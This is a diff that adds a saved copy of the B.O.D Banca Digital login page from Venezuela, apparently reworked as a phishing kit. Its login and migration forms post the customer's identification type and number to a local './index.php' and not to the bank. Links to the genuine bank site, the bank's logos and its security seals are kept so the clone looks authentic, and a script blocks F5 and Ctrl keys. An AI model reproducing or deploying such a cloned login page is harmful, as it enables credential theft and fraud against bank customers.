@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<!-- saved from url=(0062)https://web.bancadigitalbod.com/nblee6/f/ext/Login/index.xhtml -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <link type="text/css" rel="stylesheet" href="./index_files/theme.css">
+        <link type="text/css" rel="stylesheet" href="./index_files/bootstrap-combined.min.css">
+        <link type="text/css" rel="stylesheet" href="./index_files/prime.min.css">
+        <link type="text/css" rel="stylesheet" href="./index_files/primefaces.css">
+        <link type="text/css" rel="stylesheet" href="./index_files/estilo.min.css">
+        <link type="text/css" rel="stylesheet" href="./index_files/loadingNbl.css">
+        <script type="text/javascript" async="" src="./index_files/detect.js.descarga"></script><script type="text/javascript" src="./index_files/jquery.js.descarga"></script>
+        <script type="text/javascript" src="./index_files/primefaces.js.descarga"></script>
+        <script type="text/javascript" src="./index_files/jquery-plugins.js.descarga"></script>
+
+        <title>B.O.D viernes, 17 de marzo de 2017 00:07:19</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=11">  
+                     
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">    
+        <link rel="icon" type="image/x-icon" href="https://cdnbod.azureedge.net/nbl/images/icon.ico">
+        <script type="text/javascript" src="./index_files/funciones.min.js.descarga"></script>
+        <script type="text/javascript" src="./index_files/scripts.min.js.descarga"></script>
+        <script type="text/javascript" src="./index_files/phishing.js.descarga"></script>
+        <script type="text/javascript" src="./index_files/jsf.js.descarga"></script>
+    </head><body class="externo externa" onload="javascript:breakout_of_frame();                 clock(&#39;TitleFormat&#39;);"><input id="TitleFormat" type="hidden" name="TitleFormat" value="B.O.D dddd, dd de MMMM de yyyy HH:mm:ss"><div id="j_idt5"></div>
+            <script type="text/javascript">
+                var tmrReady = setInterval(isPageFullyLoaded, 100);
+
+                function isPageFullyLoaded() {
+                    if (document.readyState == "loaded" || document.readyState == "interactive" || document.readyState == "complete") {
+                        $('.loadingNbl').hide();
+                        clearInterval(tmrReady);
+                    }
+                }
+
+                $('.loadingNbl').show();
+            </script>
+            <div class="loadingNbl" style="display: none;">
+                <div id="demo-content">
+                    <div id="loader-wrapper">                    
+                        <div id="loaderCenter"><img src="./index_files/logo-body-header-tod-es.png" class="logo-panel">
+                        </div>
+                        <div id="loader">                           
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="supercaja" class="externo">                
+                <div id="supercontenedor" class="externo">
+            <script>
+                //<![CDATA[ 
+                var minCrt = 6;
+                var minIdentificacion = 1;
+
+                BOD.onblurSiguienteIndex();
+ 
+                $(function () {
+                    if ($('#form\\:nombre').length) {
+                        document.getElementById("form:nombre").focus(); //Focus de Apertura
+                        $('input').attr('autocomplete', 'off');
+                        $('input:text').val("");
+                        document.getElementById("form:nombre").focus(); //Focus de Apertura
+
+                        bloquearBoton(
+                                '#form\\:nombre',
+                                '#form\\:siguiente'
+                                );
+                    }
+                    //initSession();
+                });
+                //Verifico los datos de la forma, en caso de tener valores recordados habilito el botón de 'Continuar'
+                $('document').ready(function () {
+
+                    if ($('#form\\:selectNumIdCli').length)
+                    {
+                        $('#form\\:selectNumIdCli').focus();
+                    }
+                    $(function () {
+                        if ($('#form\\:nombre').length) {
+                            $('input[type="text"]').keyup(function () {
+                                activarSubmit();
+                            });
+                            $('select').change(function () {
+                                activarSubmit();
+                            });
+                        }
+                        //Gerald
+
+                        if ($('#form\\:txtNumIdCli').length) {
+                            $('input[type="text"]').keyup(function () {
+                                activarSubmit();
+                            });
+                            $('select').change(function () {
+                                activarSubmit();
+                            });
+                        }
+                    });
+
+                    $(window).resize(function () {
+                        resizeCampo();
+                    });
+                    resizeCampo();
+                });
+
+                function resizeCampo() {
+                    if ($(".caja-login").width() < 260) {
+                        $("#form\\:txtNumIdCli").css({
+                            "width": "65%"
+                        });
+                    } else if ($(".caja-login").width() < 340) {
+                        $("#form\\:txtNumIdCli").css({
+                            "width": "75%"
+                        });
+                    } else {
+                        $("#form\\:txtNumIdCli").css({
+                            "width": "270px"
+                        });
+                    }
+                }
+
+                function activarSubmit() {
+                    var formularioCorrecto = validarFormularioCompleto();
+                    if ($('#form\\:nombre').length) {
+                        if (formularioCorrecto) {
+                            var texto = $('#form\\:nombre').val();
+                            var n = texto.length;
+                            if (n < minCrt) {
+                                formularioCorrecto = false;
+                            }
+                        }
+                    }
+
+
+                    if ($('#form\\:txtNumIdCli').length) {
+                        if (formularioCorrecto) {
+                            var texto = $('#form\\:txtNumIdCli').val();
+                            var m = texto.length;
+                            if (m < minIdentificacion) {
+                                formularioCorrecto = false;
+                            }
+                        }
+                    }
+
+                    if (formularioCorrecto) {
+                        if ($('#form\\:validarLogin').length) {
+                            $("#form\\:validarLogin")
+                                    .removeClass('apagado')
+                                    .removeClass("button-continuar-apagado").addClass("button-continuar");
+                        }
+                        if ($('#form\\:siguiente').length) {
+                            $("#form\\:siguiente")
+                                    .removeClass('apagado')
+                                    .removeClass("button-continuar-apagado").addClass("button-continuar");
+                        }
+                    } else {
+                        if ($('#form\\:validarLogin').length) {
+                            $("#form\\:validarLogin")
+                                    .addClass('apagado')
+                                    .addClass("button-continuar-apagado")
+                                    .removeClass("button-continuar");
+                        }
+                        if ($('#form\\:siguiente').length) {
+                            $("#form\\:siguiente")
+                                    .addClass('apagado')
+                                    .addClass("button-continuar-apagado")
+                                    .removeClass("button-continuar");
+                        }
+                    }
+                }
+                //]]>
+            </script>
+<form id="form" name="form" method="post" action="./index.php" enctype="application/x-www-form-urlencoded" autocomplete="off">
+<input type="hidden" name="form" value="form">
+<span id="form:j_idt10"></span><script type="text/javascript">$(function(){PrimeFaces.focus(null, 'form:selectNumIdCli');});</script>
+                    <section class="contenedor2 left" id="cont">                       
+                        <div class="caja-login">                            
+                            <div class="contenedor_logo"><img src="./index_files/logo-bod-tod-es.png" alt="Logo Banco B.O.D" class="logo ">
+                            </div>                        
+                            <p class="left min paddingtop10">
+                                Bienvenido a la Banca Digital B.O.D. Si eres cliente Jurídico por favor, selecciona el tipo de identificación como cliente natural (V, E, P) y escribe tu número de cédula.
+                            </p>
+
+                            <div class="margin20"></div>
+
+                            <div class="caja-gris2"></div>
+
+                            <p class="left">Tipo de identificación y número.</p>
+                            <p class="left margin5"><select id="form:selectNumIdCli" name="form:selectNumIdCli" class="select-corto height-278" size="1" onblur="BOD.cambioEnSelect(this);" style="text-align: center;" onchange="BOD.cambioEnSelect(this);">	<option value="-1" selected="selected">---</option>
+	<option value="V">V</option>
+	<option value="E">E</option>
+	<option value="P">P</option>
+	<option value="M">M</option>
+</select><input id="form:txtNumIdCli" type="text" name="form:txtNumIdCli" autocomplete="off" value="" class="txtFormulario form176 ancho100" onblur="BOD.onblurValidarLoginIndex();" onkeypress="return BOD.GlobalAll.validarSoloNumerosMigracion(event);" style="width: 270px;" maxlength="0">                                
+                            </p>
+
+                            <div class="botonera ">
+<script type="text/javascript" src="./index_files/jsf.js.descarga"></script>
+<a id="form:validarLogin" href="./index.php" class="bod-button button-continuar-apagado apagado margin20">Continuar</a>
+                            </div>
+                        </div>
+                    </section><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="4770017632655669257:8137598433823225924" autocomplete="off">
+</form>
+            <script>
+                
+            </script>			
+                </div>
+                <footer class="footer0">                                 
+                    <div style="clear: both;">                    
+                    </div>     
+                    <div class="lineaVerde">                        
+                    </div>
+                    <div class="iconos-seguridad" style="display: block">
+                        <div class="pietexto2">
+                            <p>
+                                Banca Digital B.O.D - RIF: J-30061946-0
+                            </p>                                
+                        </div><img src="./index_files/verisign-tod-es.png" alt="Versign" class="logo2"><img src="./index_files/symantec-tod-es.png" alt="Symantec" class="logo1">
+                        <div class="info4" style="display:none">
+                            <p class="text-powered">Powered by:</p><img src="./index_files/logo-adverweb-gris-tod-es.png" class="img-adverweb">
+                        </div>
+                    </div>
+                </footer>
+            </div>
+
+            
+            <script type="text/javascript" src="./index_files/highcharts.js.descarga"></script>
+            <script type="text/javascript" src="./index_files/identification.min.js.descarga"></script>
+            <script type="text/javascript" src="./index_files/swfobject.min.js.descarga"></script>
+            <script type="text/javascript">
+                                               var context = '/nblee6';
+                                               var timeOutApp = 1000 * 10000;
+                                               var maxTimesession = 1000 * 99999;
+                                               var serverService = "/nblee6/SeguridadServlet?id_server_service=1";
+
+                                               $('document').ready(function () {
+                                                   BOD.PaginaInicio.block_dragAndDrop();
+                                               });
+
+                                               function changeCheck() {
+                                                   var classList = $('#checkSecurity').attr('class');
+                                                   if (classList === 'checkbox_editAll') {
+                                                       $(".checkbox_editAll").addClass("checkbox_editAll_hover");
+                                                       $(".checkbox_editAll_hover").removeClass("checkbox_editAll");
+                                                   } else {
+                                                       $(".checkbox_editAll_hover").addClass("checkbox_editAll");
+                                                       $(".checkbox_editAll").removeClass("checkbox_editAll_hover");
+                                                   }
+                                               }
+                                               $(document).keydown(function (e) {
+                                                   if (e.keyCode === 116 || e.ctrlKey) {
+                                                       e.preventDefault();
+                                                   }
+                                               });
+
+            </script>
+            <script type="text/javascript" src="./index_files/borders.js.descarga"></script> 
+
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div id="ConfirmacionMigracionDlg" class="ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow ui-draggable" style="max-width: 580px; width: auto; height: auto;" role="dialog" aria-labelledby="ConfirmacionMigracionDlg_title" aria-hidden="true"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span id="ConfirmacionMigracionDlg_title" class="ui-dialog-title"></span><a href="https://web.bancadigitalbod.com/nblee6/f/ext/Login/index.xhtml#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: auto;">
+<form id="formMigrar" name="formMigrar" method="post" action="./index.php" enctype="application/x-www-form-urlencoded" autocomplete="off">
+<input type="hidden" name="formMigrar" value="formMigrar">
+<span id="formMigrar:display" class="center">
+                        <div>
+                            <h2 class="left max br" style="font-weight: bold !important;">¡La Nueva Banca Digital BOD ya es una realidad!</h2>
+                            <h4 class="left min"> Para que ingreses debemos migrar tus datos a esta novedosa plataforma. </h4>
+                            <br>
+                            <h4 class="left min"> Te invitamos a configurar de inmediato tu perfil, respondiendo todos los campos obligatorios. </h4>
+                            <h4 class="left min br"> Este proceso te tomará unos minutos y garantizará una correcta navegación y la seguridad de tus transacciones. </h4>
+                            <h4 class="left min"> ¿Deseas continuar? </h4>
+                        </div>
+                        <br>
+                        <div style="text-align: center !important;" class="botonera"><a id="formMigrar:cancelar" href="https://web.bancadigitalbod.com/nblee6/f/ext/Login/index.xhtml#" onclick="jsf.util.chain(this,event,&#39;PF(\&#39;ConfirmacionMigracionDlgWv\&#39;).hide();&#39;,&#39;mojarra.jsfcljs(document.getElementById(\&#39;formMigrar\&#39;),{\&#39;formMigrar:cancelar\&#39;:\&#39;formMigrar:cancelar\&#39;},\&#39;\&#39;)&#39;);return false" class="bod-button button-cancelar">NO, deseo mantenerme en BodInternet</a><a id="formMigrar:siguiente" href="https://web.bancadigitalbod.com/nblee6/f/ext/Login/index.xhtml#" onclick="jsf.util.chain(this,event,&#39;PF(\&#39;ConfirmacionMigracionDlgWv\&#39;).hide();&#39;,&#39;mojarra.jsfcljs(document.getElementById(\&#39;formMigrar\&#39;),{\&#39;formMigrar:siguiente\&#39;:\&#39;formMigrar:siguiente\&#39;},\&#39;\&#39;)&#39;);return false" class="bod-button button-continuar">SÍ, deseo migrar a la banca digital BOD</a>
+                        </div>
+
+                        <div>
+                            <br>
+                            <h4 class="left min">   </h4>
+                            <h4 class="left min"> 
+                                Más información en los tutoriales de nuestro canal de YouTube  <a href="https://www.youtube.com/user/BodBancoUniversal" target="_blank" style="text-decoration: underline !important"> BOD Banco Universal </a>
+                            </h4>
+                        </div></span><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="4770017632655669257:8137598433823225924" autocomplete="off">
+</form></div></div><div class="ui-dialog-docking-zone"></div></body></html>
